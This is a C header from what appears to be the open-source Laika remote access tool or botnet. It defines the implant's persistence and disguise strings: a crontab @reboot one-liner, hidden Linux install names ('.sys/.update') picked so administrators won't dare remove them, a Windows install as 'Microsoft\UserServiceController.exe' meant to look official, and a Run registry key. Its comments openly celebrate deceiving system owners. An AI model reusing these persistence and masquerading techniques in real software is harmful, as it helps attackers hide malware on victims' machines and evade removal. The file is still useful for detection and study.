#ifndef LAIKA_BOXGEN_STRING_H
#define LAIKA_BOXGEN_STRING_H

/* =============================================[[ Linux Strings ]]============================================== */

/*      we want a semi-random file lock that is stable between similar builds,
*   so we use the GIT_VERSION as our file lock :D */
#define LAIKA_LIN_LOCK_FILE "/tmp/" LAIKA_VERSION_COMMIT

/* most sysadmins probably wouldn't dare remove something named '.sys/.update' */
#define LAIKA_LIN_INSTALL_DIR ".sys"
#define LAIKA_LIN_INSTALL_FILE ".update"

#define LAIKA_LIN_CRONTAB_ENTRY "(crontab -l ; echo \"@reboot %s\")| crontab -"

/* ============================================[[ Windows Strings ]]============================================= */

/*      we want a semi-random mutex that is stable between similar builds,
*   so we use the GIT_VERSION as our mutex :D */
#define LAIKA_WIN_MUTEX LAIKA_VERSION_COMMIT ".0"

/* looks official enough */
#define LAIKA_WIN_INSTALL_DIR "Microsoft"
#define LAIKA_WIN_INSTALL_FILE "UserServiceController.exe"

#define LAIKA_WIN_REG_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define LAIKA_WIN_REG_VAL "UserServiceController"

#endif